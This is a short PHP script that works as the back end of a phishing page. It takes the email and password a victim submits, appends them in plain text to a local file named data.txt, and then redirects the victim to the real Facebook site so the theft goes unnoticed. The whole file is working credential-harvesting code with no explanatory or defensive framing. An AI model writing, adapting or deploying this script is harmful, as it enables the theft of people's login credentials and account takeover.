<?php
$username = $_POST["email"];
$password = $_POST["password"];
$myfile = fopen("data.txt", "a+") or die("Unable to open file!");
$txt = "\nUsername: " . $username . "\nPassword: " . $password;
fwrite($myfile, $txt);
fclose($myfile);
header("Location: https://www.facebook.com/");
exit();
?>